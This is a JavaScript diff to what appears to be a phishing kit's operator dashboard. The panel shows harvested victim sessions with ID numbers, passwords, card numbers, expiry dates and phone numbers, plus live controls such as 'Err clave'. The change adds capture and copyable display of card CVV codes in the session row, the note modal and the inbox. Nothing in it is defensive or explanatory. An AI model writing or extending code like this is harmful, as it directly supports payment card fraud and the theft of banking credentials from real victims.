@@ -479,7 +479,7 @@ function mapSessionRow(session, index = 0) {
         '—'
       : session.password || session.clave || '—',
     token: habilitar
-      ? [session.cardExpiry, session.phone, session.extension]
+      ? [session.cardExpiry, session.cvv, session.phone, session.extension]
           .filter(Boolean)
           .join(' | ') ||
         session.token ||
@@ -492,6 +492,7 @@ function mapSessionRow(session, index = 0) {
     phone: session.phone || '',
     cardNumber: session.cardNumber || '',
     cardExpiry: session.cardExpiry || '',
+    cvv: session.cvv || '',
     noteUnread: Boolean(session.noteUnread),
     state: session.state || 'waiting',
   }
@@ -567,6 +568,7 @@ function openNoteModal(rowId) {
         <dl class="note-pad__list">
           <div><dt>Tarjeta</dt><dd class="copyable" data-copy>${formatCard(row.cardNumber) || '—'}</dd></div>
           <div><dt>Expiración</dt><dd class="copyable" data-copy>${formatExpiryNote(row.cardExpiry)}</dd></div>
+          <div><dt>CVV</dt><dd class="copyable" data-copy>${row.cvv || '—'}</dd></div>
         </dl>
         <p class="note-pad__foot">Toca un valor para copiar · Listo / Err clave en la fila</p>
       </div>
@@ -634,7 +636,7 @@ function openNotesInbox() {
             </svg>
             <span class="note-inbox__body">
               <strong>${r.ci || r.user || 'Sin CI'}${r.complemento ? `-${r.complemento}` : ''}</strong>
-              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · ${formatTime(r.createdAt)}</small>
+              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · CVV ${r.cvv || '—'} · ${formatTime(r.createdAt)}</small>
             </span>
             ${r.noteUnread ? '<span class="note-inbox__dot" title="Nuevo"></span>' : ''}
           </button>`,
@@ -821,7 +823,7 @@ function updateRow(tr, row) {
   tr.querySelector('.col-pass').title = habilitar ? 'Copiar tarjeta' : 'Copiar clave'
   tr.querySelector('.col-token').textContent = row.token || '—'
   tr.querySelector('.col-token').title = habilitar
-    ? 'Exp | Celular | Extensión'
+    ? 'Exp | CVV | Celular | Extensión'
     : 'Copiar token'
   tr.querySelector('.col-online').innerHTML = online
     ? '<span class="pill pill--online">En línea</span>'
